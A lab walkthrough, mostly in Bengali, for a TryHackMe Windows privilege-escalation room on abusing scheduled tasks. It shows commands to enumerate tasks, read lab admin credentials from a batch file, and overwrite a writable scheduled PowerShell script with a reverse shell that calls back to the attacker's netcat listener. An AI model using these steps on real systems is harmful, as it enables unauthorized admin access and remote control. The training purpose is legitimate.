# **************************Windows Privilege Escalation via Schedule Task**************************

### Thm room link:  [Windows PrivEsc](https://tryhackme.com/room/windows10privesc)

📝 Windows Scheduled Task (Task Scheduler) – সংক্ষিপ্ত নোট

Scheduled Task হলো Windows-এর একটি ফিচার, যা ব্যবহার করে নির্দিষ্ট সময়, ইভেন্ট বা শর্ত অনুযায়ী স্বয়ংক্রিয়ভাবে কোনো প্রোগ্রাম, স্ক্রিপ্ট বা কমান্ড চালানো যায়।

🔹 উদাহরণ:

* নির্দিষ্ট সময়ে ব্যাকআপ নেওয়া
* লগইন হলে স্ক্রিপ্ট রান করা
* সিস্টেম আপডেট চেক করা

👉 এটি মূলত Task Scheduler টুলের মাধ্যমে পরিচালিত হয়।


📊 Scheduled Task vs Windows Services

| বিষয়                  | Scheduled Task (টাস্ক স্কেজুলার)              | Windows Services (সার্ভিস)                  |
|-----------------------|-----------------------------------------------|---------------------------------------------|
| কাজের ধরণ            | নির্দিষ্ট সময়/ইভেন্টে রান হয়                 | সবসময় বা ব্যাকগ্রাউন্ডে চলতে থাকে          |
| চালু হওয়ার সময়       | ট্রিগার (time, event, condition) ভিত্তিক     | সিস্টেম বুট হলে বা ম্যানুয়ালি স্টার্ট হয়   |
| রান হওয়ার সময়কাল     | নির্দিষ্ট কাজ শেষে বন্ধ হয়ে যায়              | ক্রমাগত (continuous) রান করে               |
| ব্যবহারের উদাহরণ     | ব্যাকআপ, স্ক্রিপ্ট, আপডেট                    | antivirus, database, web server            |
| কনফিগারেশন টুল      | Task Scheduler                               | Services Manager (services.msc)            |
| ইউজার নির্ভরতা       | নির্দিষ্ট ইউজার বা সিস্টেম হিসেবে রান হতে পারে| সাধারণত system-level এ চলে                |
| রিসোর্স ব্যবহার      | কম (only when triggered)                     | বেশি (কারণ সবসময় রান করে)                |
| ফ্লেক্সিবিলিটি       | বেশি (custom trigger & condition)            | কম (always running)                        |



## Technique_1 : Find Schedule Tasks using **SCHTASKS** 
### cmd_1: Default table format
```
schtasks /fo LIST  
```
### cmd_2: Show all the taskname 
```
schtasks /fo LIST | findstr /I taskname
```
* here /I --> is igname lowercase/upercase of taskname

### cmd_3: Showing only our needed taskname [vulnerable]
```
schtasks /fo LIST | findstr /I taskname | findstr /I /V microsoft
```
* It ignore the taskname where microsoft.. Suppose here get a taskname **\Savecred** which maybe vulnerable.

### cmd_4: get all info of this schedule task **Savecred**
```
schtasks /tn Savecred /fo list /v 
```
* here the schedule task Savecred running the file **"C:\PrivEsc\savecred.bat"**

### cmd_5: get info of this file **"C:\PrivEsc\savecred.bat"**
```
type C:\PrivEsc\savecred.bat
```
* Here admin username, password , how to get admin shell is given

### cmd_6: get admin shell
```
runas /user:admin cmd.exe
```
* Enter pass: password123 and get admin shell








## Technique_2: Search for Looking suspicious 
### cmd_1: Go to DevTools [looking suspicious] and show it's files
```
cd DevTools
dir
```
* here has a CleanUp.ps1 powershell file
### cmd_2: get info of this file
```
type CleanUp.ps1
```
* It clean up logs every min like schedule task [Remove-Item C:\DevTools\*.log]

### Check this file privilege using icacls [recommended]
```
icacls CleanUp.ps1
```
* output:

```
BUILTIN\Users: (M)
NT AUTHORITY\SYSTEM: (F)
BUILTIN\Administrators: (F)
WIN-QB...\Administrators: (F)
NT AUTHORITY\SYSTEM: (I)(F)
BUILTIN\Administrators: (I)(F)
BUILTIN\Users: (I)(RX)
```

* Here (M) means --> modified(read,write,exe..)
* (F) means --> Full Access(read,write,exe and also change file permission)
* (I) means --> Inherited(folder where is in the file)

### Check this file privilege using accesschx.exe
```
C:\PrivEsc\accesschk.exe -accepteula -quv user CleanUp.ps1
```
* -accepteula means accept aggrement.. -q means quit banner, u means shows permission for the given username [user], v means also show execute
* It check only my user's permission for this file

### Check this file privilege using ECHO [easy and short]
```
echo hello > CleanUp.ps1
```
* If no error, then the file have write permission for this user

```
echo echo ^> C:\Users\user\test.txt > CleanUp.ps1
```
* If test.txt file is created then we can ensure that thae CleanUp.ps1 file run in every min / epecific time later..

```
type CleanUp.ps1
```
* output: echo > C:\Users\user\test.txt

```
dir C:\Users\user\
```
* Check the file is created or not ..Here it is created

### Now Create ReverseShell & get admin Access
website : revshells.com
IP : my_machine_tun0, PORT: 4444, 
OS: powershell#3(Base64)  [copy this code]

* Now create netcat listener to my kali on port 4444
```
nc -nvlp 4444
```
* append this copied code to CleapUp.ps1
```
echo copyed_code > CleanUp.ps1
```
* Now after a specific time when CleanUp.ps1 run it gives a reverse connection to my kali ..